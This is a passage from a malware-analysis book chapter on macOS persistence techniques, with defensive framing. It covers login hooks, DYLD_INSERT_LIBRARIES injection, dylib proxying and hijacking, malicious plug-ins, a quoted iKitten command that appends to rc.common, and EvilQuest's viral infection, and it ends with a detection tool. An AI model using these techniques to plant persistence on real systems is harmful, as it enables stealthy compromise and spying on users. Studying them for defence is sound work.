<p class="BodyFirst">Yet another way to achieve persistence on macOS is via <em>login</em> and <em>logout hooks</em>. Scripts or commands installed as login or logout hooks will execute automatically whenever a user logs in or out. You’ll find these hooks stored in the user-specific <em>~/Library/Preferences/com.apple.loginwindow.plist </em>file as key/value pairs. The key’s name should be either <code>LoginHook</code> or <code>LogoutHook</code>, with a string value set to the path of the file to execute at either login or logout (<a href="#listing2-16" id="listinganchor2-16">Listing 2-16</a>).</p>
<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&lt;!DOCTYPE plist ...&gt;<br/>&lt;plist version="1.0"&gt;<br/> &lt;dict&gt;     <br/>  &lt;key&gt;LoginHook&lt;/key&gt;<br/>  <span aria-label="annotation1" class="CodeAnnotationHang">1</span> &lt;string&gt;/usr/bin/hook.sh&lt;/string&gt; <br/> &lt;/dict&gt;<br/>&lt;/plist&gt;</code></pre>
<p class="CodeListingCaption"><a id="listing2-16">Listing 2-16</a>: An example <code>LoginHook</code></p>
<p>In this example, the script <em>hook.sh</em> <span aria-label="annotation1" class="CodeAnnotation">1</span> will be executed each time the user logs in. Note that there can only be one <code>LoginHook</code> and one <code>LogoutHook</code> key/value pair specified at any given time. However, if malware encounters a system with a legitimate login or logout hook already present, it could append additional commands to the existing hook to gain persistence. Perhaps due to the fact that Apple has moved to deprecate this persistence technique, no malware leverages such hooks.</p>
<h2 id="h1--0005">Dynamic Libraries</h2>
<p class="BodyFirst"><em>Dynamic libraries (dylibs)</em> are modules containing executable code that a process can load and execute. Apple’s developer documentation explains the reasoning behind the use of dynamic libraries, pointing out that operating systems already “implement much of the functionality apps need in libraries.”<sup class="endnote"><a href="#-endnote-9" id="-noteref-9">9</a></sup> Thus, app programmers can link their code against these libraries rather than re-create the functionality from scratch. Though you can statically link libraries into a program, doing so increases both the size of the program as well as its memory usage. In addition, if a flaw were discovered in the library, the program would need to be rebuilt to take advantage of any fixes or updated functionality. On the other hand, dynamically linking a library merely adds a specified dependency to the program; the actual <span epub:type="pagebreak" id="Page_35" title="35"/>library code is not compiled in. When the program is launched or needs to access library functionality, the library is then dynamically loaded. This reduces both the size of the program and its total memory usage. Programs that dynamically load these libraries will automatically benefit from any fixes and updated functionality.</p>
<p>The majority of persistence mechanisms abused by Mac malware coerce the operating system into automatically launching some standalone application or binary. While this is all well and good in terms of gaining and maintaining persistence, it generally results in a new untrusted process running on the system. An inquisitive user may notice this, especially if they peek at list of running processes. Moreover, security tools, which largely focus on process-level events, may readily detect such new processes, thus uncovering the malware. </p>
<p>More stealthy persistence mechanisms instead leverage dynamic libraries. Because these libraries are loaded within a trusted host process, they themselves do not result in a new process. Thus, an examination of running processes will not readily reveal their presence, which may also remain undetected by security tools. The idea of using dynamic libraries for persistence is fairly straightforward. Malware first locates an existing process that regularly gets started, either automatically by the system or manually by the user (the user’s browser is a good example of such a process). It then coerces that process into loading malicious libraries. </p>
<p>In this section, we’ll first discuss generic methods of dylib persistence that malware could abuse to target a wide range of processes. Following this, we’ll explore specific plug-in–based persistence approaches that malware can leverage for a stealthy means of re-execution. Note that malware authors may also abuse dynamic libraries for purposes other than persistence, like to subvert processes of interest, such as the user’s browser. Moreover, once it’s loaded in a process, a dynamic library inherits that process’s permissions, which may provide the malware with access to protected devices, such as the webcam or mic as well as other sensitive resources.</p>
<h3 id="h2--0004">DYLD_* Environment Variables</h3>
<p class="BodyFirst">Any code can use the <code>DYLD_*</code> environment variables, such as <code>DYLD_INSERT_LIBRARIES</code> and <code>DYLD_FRAMEWORK_PATH</code>, to inject any dynamic library into a target process at load time. When loading a process, the dynamic loader will examine the <code>DYLD_INSERT_LIBRARIES</code> variable and load any libraries it specifies. By abusing this technique, an attacker can ensure that the target process loads a malicious library whenever that process is started. If the process often starts automatically or the user frequently starts it, this technique affords a fairly reliable and highly stealthy persistence technique.<sup class="endnote"><a href="#-endnote-10" id="-noteref-10">10</a></sup></p>
<p>The specific means of persistently injecting a dynamic library via <code>DYLD_*</code> environment variables varies. If the malware is targeting a launch item, it could modify the item’s property list by inserting a new key/value pair into it. The key, <code>EnvironmentVariables</code>, would reference a dictionary containing a <code>DYLD_INSERT_LIBRARIES</code> key/value pair that points to the malicious dynamic library. If the malware is targeting an application, the approach involves <span epub:type="pagebreak" id="Page_36" title="36"/>modifying the application’s <em>Info.plist</em> file and inserting a similar key/value pair, albeit with a key name of <code>LSEnvironment</code>. </p>
<p>Let’s look at an example. The notorious FlashBack malware abused this technique to maintain persistence by targeting users’ browsers. <a href="#listing2-17" id="listinganchor2-17">Listing 2-17</a> is a snippet of a Safari <em>Info.plist</em> file that FlashBack has subverted. </p>
<pre><code>&lt;key&gt;LSEnvironment&lt;/key&gt;<br/>&lt;dict&gt;<br/> &lt;key&gt;DYLD_INSERT_LIBRARIES&lt;/key&gt;<br/> <span aria-label="annotation1" class="CodeAnnotationHang">1</span> &lt;string&gt;/Applications/Safari.app/Contents/Resources/UnHackMeBuild&lt;/string&gt;<br/>&lt;/dict&gt;</code></pre>
<p class="CodeListingCaption"><a id="listing2-17">Listing 2-17</a>: <code>DYLD_INSERT_LIBRARIES</code> persistence (FlashBack)</p>
<p>Notice that the FlashBack malware has added an <code>LSEnvironment</code> dictionary to the file, containing a <code>DYLD_INSERT_LIBRARIES</code> key/value pair. The value points to the malware’s malicious dynamic library <span aria-label="annotation1" class="CodeAnnotation">1</span>, which macOS will now load and execute within Safari’s context whenever the browser is launched.<sup class="endnote"><a href="#-endnote-11" id="-noteref-11">11</a></sup></p>
<p>Since 2012, when FlashBack abused this technique, Apple has drastically reduced the scope of the <code>DYLD_*</code> environment variables. For example, the dynamic loader (<code>dyld</code>) now ignores these variables in a wide range of cases, such as for Apple’s platform binaries or for third-party applications compiled with the hardened runtime. It is also worth noting that platform binaries and those protected by the hardened runtime may be insusceptible to other dynamic library insertions, like those discussed later in this section. For more details on the security features afforded by the hardened runtime, see Apple’s documentation titled “Hardened Runtime.”<sup class="endnote"><a href="#-endnote-12" id="-noteref-12">12</a></sup></p>
<p>Despite these precautions, many operating system components and popular third-party applications still support the loading of arbitrary dynamic libraries. Moreover, platform binaries and applications that have opted in to the hardened runtime may provide exceptions such as <code>com.apple.security.cs.allow-dyld-environment-variables</code> or <code>com.apple.security.cs.disable-library-validation</code> entitlements, which allow malicious dynamic libraries to be loaded. Thus, ample opportunities for dynamic library-based persistence still exist.</p>
<h3 id="h2--0005">Dylib Proxying</h3>
<p class="BodyFirst">A more modern approach to dynamic library injection involves a technique I’ve dubbed <em>dylib proxying</em>. In short, dylib proxying replaces a library that a target process depends on with a malicious library. Now, whenever the targeted application starts, the malicious dynamic library will be loaded and executed instead. </p>
<p>To keep the application from losing legitimate functionality, the malicious library proxies requests to and from the original library. It can achieve this proxying by creating a dynamic library that contains a <code>LC_REEXPORT_DYLIB</code> load command. We’ll discuss load commands in <span class="xref" itemid="xref_target_Chapter 5">Chapter 5</span>; for now just know that the <code>LC_REEXPORT_DYLIB</code> load command essentially tells the dynamic loader, “Hey, while I, the malicious library, don’t implement the required <span epub:type="pagebreak" id="Page_37" title="37"/>functionality you’re looking for, I know who does!” As it turns out, this is the only information the loader needs to maintain the functionality provided by the proxied library. </p>
<p>Though we’ve yet to see malware abuse this dylib proxying technique, security researchers (myself included) have leveraged it in order to subvert various applications. Notably, I’ve abused Zoom to access a user’s webcam and achieved stealthy persistence each time they open the video conferencing application. Let’s briefly examine the details of this specific attack against Zoom, as it provides a practical example of how an attacker or malware could achieve stealthy dynamic library-based persistence. </p>
<p>Though Zoom compiles its application with a hardened runtime, which normally thwarts dynamic library injection attacks, older versions contained the <code>com.apple.security.cs.disable-library-validation</code> entitlement. This entitlement instructs macOS to disable library validation, allowing arbitrary libraries to be loaded into Zoom. To gain persistence, malware could proxy one of Zoom’s dependencies, such as its SSL library, <em>libssl.1.0.0.dylib</em>. The malware could make a copy of the legitimate SSL library, named something like <em>libssl.1.0.0_COPY.dylib</em>, and then create a malicious proxy library with the same name as the original SSL library. This malicious library would contain an <code>LC_REEXPORT_DYLIB</code> load command that points to the SSL library copy. To see this process in practice, take a look at the following output from macOS’s <code>otool</code>, run with the <code>-l</code> flag, to list the malicious dynamic library’s load commands (<a href="#listing2-18" id="listinganchor2-18">Listing 2-18</a>).</p>
<pre><code>% <b>otool -l zoom.us.app/Contents/Frameworks/libssl.1.0.0.dylib</b> <br/>...<br/>Load command 11<br/>          cmd LC_REEXPORT_DYLIB <span aria-label="annotation1" class="CodeAnnotationCode">1</span><br/>      cmdsize 96<br/>         name /Applications/zoom.us.app/Contents/Frameworks/libssl.1.0.0_COPY.dylib <span aria-label="annotation2" class="CodeAnnotationCode">2</span><br/>   time stamp 2 Wed Dec 31 14:00:02 1969<br/>      current version 1.0.0<br/>compatibility version 1.0.0</code></pre>
<p class="CodeListingCaption"><a id="listing2-18">Listing 2-18</a>: A proxy dynamic library </p>
<p>Note that this library contains a reexport directive <span aria-label="annotation1" class="CodeAnnotation">1</span> that points to the original SSL library <span aria-label="annotation2" class="CodeAnnotation">2</span>. This ensures that the SSL functionality required to run the app isn’t lost. Once the malicious proxy library is in place, it will load automatically and execute its constructor any time the user launches Zoom. Now, in addition to persistence, the malware has access to Zoom’s privacy permissions, such as those for the mic and camera, allowing it to spy on the user via their webcam!</p>
<h3 id="h2--0006">Dylib Hijacking</h3>
<p class="BodyFirst">Dylib hijacking is a stealthier, albeit less generic, version of dylib proxying. In a <em>dylib hijack</em>, malware can exploit a program that either attempts to load dynamic libraries from multiple attacker-writable locations or that has a weak dependency on a dynamic library that does not exist. In the <span epub:type="pagebreak" id="Page_38" title="38"/>former case, if the primary location doesn’t contain the library, the app will search for it in a second location. In this case, malware could install itself as a malicious library of the same name in the first location that the program would then naively load. For example, say an application attempts to load <em>foo.dylib</em> from the application’s <em>Library/</em> directory first, and then from the <em>/System/Library</em> directory. If <em>foo.dylib</em> doesn’t exist in the application’s <em>Library/</em> directory, an attacker could add a malicious library of the same name at that location. This malicious library would load automatically at runtime. </p>
<p>Let’s look at a specific example. On certain older versions of macOS, including OS X 10.10, Apple’s iCloud photo stream agent would attempt to load a dynamic library named <em>PhotoFoundation</em> from either the <em>iPhoto.app/Contents/Library/LoginItems/</em> or the <em>iPhoto.app/Contents/Framework</em> directory. As the library was found in the second directory, malware could plant a malicious dynamic library of the same name in the primary directory. On subsequent launches, the agent would first encounter and load the malicious dynamic library. And as the agent was automatically started each time the user logged in, it afforded a highly stealthy means of persistence (<a href="#listing2-19" id="listinganchor2-19">Listing 2-19</a>).</p>
<pre><code>$ <b>reboot </b><br/><br/>$ <b>lsof -p </b><var>&lt;pid of Photo Stream Agent&gt;</var><br/>. . .<br/>/Applications/iPhoto.app/Contents/Library/LoginItems/PhotoFoundation.framework/Versions/A/PhotoFoundation</code></pre>
<p class="CodeListingCaption"><a id="listing2-19">Listing 2-19</a>: A dynamic library hijacker, PhotoFoundation, loaded by Apple’s Photo Stream Agent</p>
<p>A program may also be vulnerable to a dylib hijack if it has an optional, or <em>weak</em>, dependency on a dynamic library that does not exist. When a dependency is weak, the program will always look for the dynamic library but can still execute if it doesn’t exist. However, if malware is able to plant a malicious dynamic library in the weakly specified location, the program will then load it on subsequent launches. If you’re interested in learning more about dylib hijacking, see either my research paper on the topic, “Dylib hijacking on OS X,” or “MacOS Dylib Injection through Mach-O Binary Manipulation.”<sup class="endnote"><a href="#-endnote-13" id="-noteref-13">13</a></sup></p>
<p>Though Mac malware hasn’t been known to leverage this technique in the wild in order to persist, the post-exploitation agent EmPyre has a persistence module that leverages dylib hijacking (<a href="#listing2-20" id="listinganchor2-20">Listing 2-20</a>):<sup class="endnote"><a href="#-endnote-14" id="-noteref-14">14</a></sup></p>
<pre><code>import base64<br/>class Module:<br/><br/>    def __init__(self, mainMenu, params=[]):<br/><br/>        # metadata info about the module, not modified during runtime<br/>        self.info = {<br/>            # name for the module that will appear in module menus<br/>            'Name': 'CreateDylibHijacker',<br/><br/><span epub:type="pagebreak" id="Page_39" title="39"/>            # list of one or more authors for the module<br/>            'Author': ['@patrickwardle,@xorrior'],<br/><br/>            # more verbose multi-line description of the module<br/>            'Description': ('Configures and EmPyre dylib for use in a Dylib hijack, given the <br/>            path to a legitimate dylib of a vulnerable application. The architecture of the <br/>            dylib must match the target application. The configured dylib will be copied local <br/>            to the hijackerPath'),<br/><br/>            # True if the module needs to run in the background<br/>            'Background' : False,<br/><br/>            # File extension to save the file as<br/>            'OutputExtension' : "",<br/><br/>            'NeedsAdmin' : True,<br/><br/>            # True if the method doesn't touch disk/is reasonably opsec safe<br/>            'OpsecSafe' : False,<br/><br/>            # list of any references/other comments<br/>            'Comments': [<br/>                'comment',<br/>                'https://www.virusbulletin.com/virusbulletin/2015/03/dylib-hijacking-os-x'<br/>            ]<br/>        }</code></pre>
<p class="CodeListingCaption"><a id="listing2-20">Listing 2-20</a>: A dylib hijacking persistence module, <em>CreateHijacker.py</em> (EmPyre)</p>
<p>These dylib hijack techniques only work against applications that are specifically vulnerable, which is to say, ones that search for dynamic libraries in multiple locations or that have a weak, nonexistent dependency. Moreover, if malware hopes to use this technique for persistence, the vulnerable programs must be either started automatically or commonly launched. Finally, on recent versions of macOS, mitigations such as the hardened runtime may minimize that impact of all dylib injection, as these protections generically prevent the loading of arbitrary dynamic libraries.</p>
<h2 id="h1--0006">Plug-ins</h2>
<p class="BodyFirst">Many Apple daemons and third-party applications support plug-ins or extensions by design, whether as dynamic libraries, packages, or various other file formats. While plug-ins can legitimately extend a program’s functionality, malware may abuse these features to achieve stealthy persistence within the context of the process. How? Generally by creating a compatible plug-in and installing it into the program’s plug-in directory. </p>
<p>For example, all modern browsers support plug-ins or extensions that a browser automatically executes each time it’s started, providing a convenient way for malicious code to persist. Moreover, such plug-ins are afforded direct access to users’ browsing sessions, allowing malicious code, such as adware, to display ads, hijack traffic, extract saved passwords, and more. </p>
<p><span epub:type="pagebreak" id="Page_40" title="40"/>These extensions can operate quite stealthily. Consider the malicious browser extension Pitchofcase, shown in <a href="#figure2-3" id="figureanchor2-3">Figure 2-3</a>. In a write-up, security researcher Phil Stokes notes that “at first blush, Pitchofcase seems like any other adware extension: when enabled it redirects user searches through a few pay-for-click addresses before landing on <em>pitchofcase.com</em>. The extension runs invisibly in the background without a toolbar button or any other means to interact with it.”<sup class="endnote"><a href="#-endnote-15" id="-noteref-15">15</a></sup> Moreover, Phil noted that if one clicks the Uninstall button, shown in <a href="#figure2-3">Figure 2-3</a>, the browser extension won’t actually be uninstalled.</p>
<figure>
<img alt="&lt;&lt;Pitchofcase website with Safari’s Preferences window opened. The Extensions tab is selected, which displays Pitchofcase and its permissions, such as reading sensitive information on all web pages, including passwords, phone numbers, and credit cards, and viewing the user’s entire browsing history.&gt;&gt;" class="" src="image_fi/501942c02/f02003.png"/>
<figcaption><p><a id="figure2-3">Figure 2-3</a>: A malicious browser extension (adware)</p></figcaption>
</figure>
<p>More recent examples of malicious browser extensions include Shlayer, Bundlore, and Pirrit. The latter is especially notable, as it was the first malware to natively target Apple’s new M1 chips, which were released in 2020.<sup class="endnote"><a href="#-endnote-16" id="-noteref-16">16</a></sup> </p>
<p>Of course, malware can subvert other kinds of applications in a similar manner. For example, in the “iTunes Evil Plugin Proof of Concept” blog post, security researcher Pedro Vilaça illustrated how an attacker could coerce iTunes to load a malicious plug-in on OS X 10.9. Because a user could write to the iTunes plug-in folder, Vilaça observes that “a trojan dropper can easily load a malicious plug-in. Or it can be used as [a] communication channel for a RAT.”<sup class="endnote"><a href="#-endnote-17" id="-noteref-17">17</a></sup> From there, Vilaça describes how the malware could subvert iTunes in order to steal users’ credentials, but the malicious plug-in could also provide persistence, as it’s automatically loaded and executed each time iTunes is launched. </p>
<p>Finally, various Apple daemons support third-party plug-ins, including those for authorization, directory services, QuickLook, and Spotlight, that malware could abuse for stealthy persistence.<sup class="endnote"><a href="#-endnote-18" id="-noteref-18">18</a></sup> That said, each new release of macOS continues to limit the impact of plug-ins through entitlements, code-signing checks, sandboxing, and other security features. Perhaps due to their ever-limited impact, no known malware currently abuses these plug-ins for persistence. </p>
<h2 id="h1--0007"><span epub:type="pagebreak" id="Page_41" title="41"/>Scripts</h2>
<p class="BodyFirst">Mac malware might modify various system scripts to achieve persistence. One such script is the <em>rc.common</em> file found in <em>/etc</em>. On older versions of macOS, this shell script executes during the boot process, allowing malware to insert arbitrary commands into it that would execute whenever such systems start. For example, the iKitten malware abuses this file using a method, aptly named <code>addToStartup</code>, that persists a malicious shell script whose path is passed in as the method’s sole parameter (<a href="#listing2-21" id="listinganchor2-21">Listing 2-21</a>).</p>
<pre><code>-[AppDelegate addToStartup:(NSString*)item] { <br/> <br/>  name = [item lastPathComponent];<br/>  cmd  = [NSString stringWithFormat:@"if cat /etc/rc.common | grep %@; then sleep 1; <br/>              else echo 'sleep %d &amp;&amp; %@ &amp;' &gt;&gt; /etc/rc.common; fi", name, 120, item]; <span aria-label="annotation1" class="CodeAnnotationCode">1</span><br/>  [CUtils ExecuteBash:command]; <span aria-label="annotation2" class="CodeAnnotationCode">2</span><br/>  ...<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing2-21">Listing 2-21</a>: Subversion of the <em>rc.common</em> file for persistence (iKitten)</p>
<p>This method builds a command whose logic first checks if the name of the shell script is already present in the <em>rc.common</em> file <span aria-label="annotation1" class="CodeAnnotation">1</span>. If not, the <code>else</code> logic will append the script to the end of the file. This command then is executed by a call to a method named <code>ExecuteBash</code> <span aria-label="annotation2" class="CodeAnnotation">2</span>. </p>
<p>Other scripts ripe for persistent subversion may be application-specific. One such example is shell initialization scripts, such as <em>.bashrc</em> or <em>.bash_profile</em>, which may be automatically executed when a user launches a shell.<sup class="endnote"><a href="#-endnote-19" id="-noteref-19">19</a></sup> Though the modification of such scripts affords a potential avenue for persistence, this persistence is dependent on the application being executed, and thus won’t occur if the user doesn’t spawn a shell. </p>
<h2 id="h1--0008">Event Monitor Rules</h2>
<p class="BodyFirst">Volume I of Jonathan Levin’s <em>*OS Internals</em> describes how Mac malware might abuse the event monitor daemon (<code>emond</code>) to achieve persistence.<sup class="endnote"><a href="#-endnote-20" id="-noteref-20">20</a></sup> As the operating system automatically launches <code>emond</code> during system boot, processing and executing any specified rules, malware can simply create a rule for the daemon to automatically execute. You can find the rules that <code>emond</code> will execute in the <em>/etc/emond.d/rules</em> or <em>/private/var/db/emondClients</em> directories. At this time, no malware is known to leverage such rules for persistence.</p>
<h2 id="h1--0009">Reopened Applications</h2>
<p class="BodyFirst">Mac users are likely familiar with the following prompt, shown upon logging out (<a href="#figure2-4" id="figureanchor2-4">Figure 2-4</a>).</p>
<span epub:type="pagebreak" id="Page_42" title="42"/><figure>
<img alt="&lt;&lt;Pop-up window asking “Are you sure you want to quit all applications and log out now?” The user has checked the box “Reopen windows when logging back in.”&gt;&gt;" class="" src="image_fi/501942c02/f02004.png"/>
<figcaption><p><a id="figure2-4">Figure 2-4</a>: The reopen applications prompt</p></figcaption>
</figure>
<p>If the box is left checked, macOS will automatically relaunch any running applications upon the next login. Behind the scenes, it stores the applications to be reopened in a property list named <em>com.apple.loginwindow.&lt;UUID&gt;.plist</em> within the <em>~/Library/Preferences/ByHost</em> directory. The UUID in the path is simply the system hardware’s unique identifier. Using macOS’s <code>plutil</code>, you can view the contents of this property list (<a href="#listing2-22" id="listinganchor2-22">Listing 2-22</a>):</p>
<pre><code>% <b>plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.151CA171-718D-592B-B37C-ABB9043C4BE2.plist</b><br/>{<br/>  "TALAppsToRelaunchAtLogin" =&gt; [<br/>    0 =&gt; {<br/>      "BackgroundState" =&gt; 2<br/>      "BundleID" =&gt; "com.apple.ichat"<br/>      "Hide" =&gt; 0<br/>      "Path" =&gt; "/System/Applications/Messages.app"<br/>    }<br/>    1 =&gt; {<br/>      "BackgroundState" =&gt; 2<br/>      "BundleID" =&gt; "com.google.chrome"<br/>      "Hide" =&gt; 0<br/>      "Path" =&gt; "/Applications/Google Chrome.app"<br/>    }<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing2-22">Listing 2-22</a>: The reopened applications property list</p>
<p>As you can see, the file contains various key/value pairs, including the bundle identifier and the path to the application to relaunch. Though no malware is known to persist in this manner, it could add itself directly to this property list and thus be automatically re-executed the next time the user logs in. To ensure continued persistence, it would be wise for the malware to monitor this plist and re-add itself if needed.</p>
<h2 id="h1--0010">Application and Binary Modifications</h2>
<p class="BodyFirst">Stealthy malware may achieve persistence by modifying legitimate programs found on the infected system in such a way that launching these programs runs the malicious code. In early 2020, security researcher <span epub:type="pagebreak" id="Page_43" title="43"/>Thomas Reed released a report that highlighted the sophistication of adware targeting macOS. In this report, he notes that the prolific adware Crossrider subverts Safari in order to persist various malicious browser extensions. By creating a modified version of the application, Crossrider makes the application enable malicious Safari extensions whenever the user opens the browser, without requiring user actions. It then deletes this copy of Safari, Reed wrote, “leaving the real copy of Safari thinking that it’s got a couple additional browser extensions installed and enabled.”<sup class="endnote"><a href="#-endnote-21" id="-noteref-21">21</a></sup></p>
<p>Another example from early 2020, EvilQuest combines several persistence techniques. The malware initially persists as a launch item but also virally infects various binaries on the system. This measure ensures that, even if a user removes the launch item, the malware retains persistence! This kind of viral persistence is rare on macOS, so it merits taking a closer look. When initially executed, EvilQuest spawns a new background thread to find and infect other binaries. The function responsible for generating a list of candidates is descriptively named <code>get_targets</code>, while the infection function is called <code>append_ei</code>. You can see these in the following disassembly (<a href="#listing2-23" id="listinganchor2-23">Listing 2-23</a>). </p>
<pre><code>ei_loader_thread:<br/>0x000000010000c9a0         push       rbp<br/>0x000000010000c9a1         mov        rbp, rsp<br/>0x000000010000c9a4         sub        rsp, 0x30<br/>0x000000010000c9a8         lea        rcx, qword [is_executable]<br/>...<br/>0x000000010000c9e0         call     <span aria-label="annotation1" class="CodeAnnotationCode2">1</span> get_targets<br/>0x000000010000c9e5         cmp        eax, 0x0<br/>0x000000010000c9e8         jne        leave<br/>...<br/>0x000000010000ca17         mov        rsi, qword [rax] <br/>0x000000010000ca1a         call     <span aria-label="annotation2" class="CodeAnnotationCode2">2</span> append_ei</code></pre>
<p class="CodeListingCaption"><a id="listing2-23">Listing 2-23</a>: Viral infection logic (EvilQuest)</p>
<p>As shown here, each candidate executable found via the <code>get_targets</code> function <span aria-label="annotation1" class="CodeAnnotation">1</span> is passed to the <code>append_ei</code> function <span aria-label="annotation2" class="CodeAnnotation">2</span>. The <code>append_ei</code> function inserts a copy of the malware at the start of the target binary, and then rewrites the original target bytes to the end of the file. Finally, it adds a trailer to the end of the file that includes an infection marker, <code>0xdeadface</code>, and the offset in the file to the original target’s bytes. We’ll discuss this further in <span class="xref" itemid="xref_target_Chapter 11">Chapter 11</span>.</p>
<p>Once the malware has infected a binary by wholly inserting itself at the start of the file, it will run whenever anyone executes the file. When it runs, the first thing it does is check if its main persistence mechanism, the launch item, has been removed; if it has, it replaces its malicious launch item. To avoid detection, the malware also executes the contents of the original file by parsing the trailer to get the location of the file’s original bytes. These bytes are then written out to a new file, named <em>&lt;originalfilename&gt;1</em>, which the malware then executes.</p>
<h2 id="h1--0011"><span epub:type="pagebreak" id="Page_44" title="44"/>KnockKnock . . . Who’s There?</h2>
<p class="BodyFirst">If you’re interested in finding out what software or malware is persistently installed on your macOS system, I’ve created a free open source utility just for this purpose. KnockKnock tells you who’s there, querying your system for any software that leverages many of the myriad of persistence mechanisms discussed in this chapter (<a href="#figure2-5" id="figureanchor2-5">Figure 2-5</a>).<sup class="endnote"><a href="#-endnote-22" id="-noteref-22">22</a></sup> It’s worth pointing out that, as legitimate software will often persist as well, the vast majority (if not all) of the items displayed by KnockKnock will be wholly benign.</p>
<figure>
<img alt="KnockKnock’s home page contains a play button at the top center of the screen to Start Scan. On the left side, there is a list of categories that includes Library Proxies, Login Items, Login/Logout Hooks, Periodic Scripts, Quicklook Plugins, Spotlight Importers, and Startup Scripts." class="" src="image_fi/501942c02/f02005.png"/>
<figcaption><p><a id="figure2-5">Figure 2-5</a>: KnockKnock? Who’s there? . . . Hopefully only legitimate software!</p></figcaption>
</figure>
<h2 id="h1--0012">Up Next</h2>
<p class="BodyFirst">In this chapter we discussed numerous persistence mechanisms that macOS malware can abuse to maintain its access to infected systems. For good measure, we also discussed several potential methods of persisting on a macOS system that malware has yet to leverage in the wild. </p>
<p>Creating a truly comprehensive list of these persistence methods is most likely an exercise in futility. First, Apple has deprecated several very dated ways to persist, such as via the <em>StartupParameters.plist </em>file, and thus these no longer work on recent versions of macOS. That’s why I didn’t cover such methods in this chapter. Secondly, Mac malware authors are a creative bunch. Though we’ve shed light on many methods of persistence, we’d be naive to assume that malware authors will stick solely to those methods. Instead, they’ll surely find new or innovative ways to persist their malicious creations! </p>
<p><span epub:type="pagebreak" id="Page_45" title="45"/>If you’re interested in learning more about methods of persistence, including historical methods that no longer function and methods uncovered after the publication of this book, I encourage you to explore the following resources:</p>
<ul>
<li>“Persistence,” MITRE ATT&amp;CK, <a class="LinkURL" href="https://attack.mitre.org/tactics/TA0003/">https://attack.mitre.org/tactics/TA0003/</a></li>
<li>“Beyond the good ol’ LaunchAgents,” Theevilbit blog, <a class="LinkURL" href="https://theevilbit.github.io/beyond/beyond_intro/">https://theevilbit.github.io/beyond/beyond_intro/</a></li>
<li>“Methods of Malware Persistence on Mac OS X,” Virus Bulletin, <a class="LinkURL" href="https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf">https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf</a></li>
</ul>
<p>In the next chapter, we’ll explore the objectives of malware once it has persistently infected a Mac system.</p>
<h2 id="h1--0013">Endnotes</h2>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#-noteref-1" id="-endnote-1">	1</a></sup>	“Block Blocking Login Items,” <em>Objective-See</em>, July 23, 2018, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x31.html">https://objective-see.com/blog/blog_0x31.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#-noteref-2" id="-endnote-2">	2</a></sup>	“Modern Login Items,” Martiancraft blog, January 22, 2015, <a class="LinkURL" href="https://martiancraft.com/blog/2015/01/login-items/">https://martiancraft.com/blog/2015/01/login-items/</a>; “Adding Login Items,” Apple Developer documentation, updated September 13, 2016, <a class="LinkURL" href="https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLoginItems.html">https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLoginItems.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#-noteref-3" id="-endnote-3">	3</a></sup>	“The Mac Malware of 2019,” <em>Objective-See</em>, January 1, 2020, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x53.html">https://objective-see.com/blog/blog_0x53.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#-noteref-4" id="-endnote-4">	4</a></sup>	A Launchd tutorial, <a class="LinkURL" href="https://www.launchd.info/">https://www.launchd.info/</a>; “Getting Started with Launchd for Sys Admins,” Penn State MacAdmins Conference 2012, <a class="LinkURL" href="https://macadmins.psu.edu/files/2012/11/psumacconf2012-launchd.pdf">https://macadmins.psu.edu/files/2012/11/psumacconf2012-launchd.pdf</a><em>.</em></p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#-noteref-5" id="-endnote-5">	5</a></sup>	EmPyre, a post-exploitation OS X/Linux agent, <a class="LinkURL" href="https://github.com/EmpireProject/EmPyre/">https://github.com/EmpireProject/EmPyre/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#-noteref-6" id="-endnote-6">	6</a></sup>	“Wikipedia: The Free Encyclopedia,” Wikimedia Foundation, last edited on 20 November 2021, at 17:26 (UTC) since this book’s publication, <a class="LinkURL" href="https://en.wikipedia.org/wiki/Cron">https://en.wikipedia.org/wiki/Cron</a>. </p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#-noteref-7" id="-endnote-7">	7</a></sup>	See the chapter titled “System Startup and Scheduling” in Jaron Bradley, <em>OS X Incident Response: Scripting and Analysis</em> (Syngress, 2016). </p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#-noteref-8" id="-endnote-8">	8</a></sup>	“What is the difference between ‘periodic’ and ‘cron’ on OS X?” <a class="LinkURL" href="https://superuser.com/questions/391204/what-is-the-difference-between-periodic-and-cron-on-os-x/">https://superuser.com/questions/391204/what-is-the-difference-between-periodic-and-cron-on-os-x/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#-noteref-9" id="-endnote-9">	9</a></sup>	“Dynamic Library Programming Topics,” Apple Developer Library, updated July 23, 2012, <a class="LinkURL" href="https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/DynamicLibraries/000-Introduction/Introduction.html#//apple_ref/doc/uid/TP40001908-SW1/">https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/DynamicLibraries/000-Introduction/Introduction.html#//apple_ref/doc/uid/TP40001908-SW1/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#-noteref-10" id="-endnote-10">	10</a></sup>	For additional technical details on this technique, see “Simple code injection using DYLD_INSERT_LIBRARIES,” Timac blog, December 18, 2012, <a class="LinkURL" href="https://blog.timac.org/2012/1218-simple-code-injection-using-dyld_insert_libraries/">https://blog.timac.org/2012/1218-simple-code-injection-using-dyld_insert_libraries/</a>.</p></aside>
